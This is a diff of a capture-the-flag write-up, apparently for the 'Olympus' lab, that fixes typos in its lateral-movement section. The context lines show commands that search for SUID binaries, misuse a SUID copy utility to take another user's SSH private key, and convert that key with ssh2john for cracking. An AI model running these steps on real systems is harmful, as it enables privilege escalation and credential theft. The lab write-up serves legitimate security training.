@@ -239,7 +239,7 @@ www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$
 ```
 # Lateral movement
 
-Doing my usual routine i found interssting that we can execute cputils
+Doing my usual routine i found cputils ! Cputils has the SUID bit set for the user zeus
 
 ```bash
 www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/dev/null | grep -v /snap*
@@ -294,7 +294,7 @@ Enter the Name of Target File: /dev/shm/id_rsa
 
 File copied successfully.
 ```
-Know that we have the key we need to make it usable.
+Now that we have the key we need to make it usable.
 
 ```bash
 root@ip-10-10-239-74:~# /opt/john/ssh2john.py id_rsa > id_rsa.hash
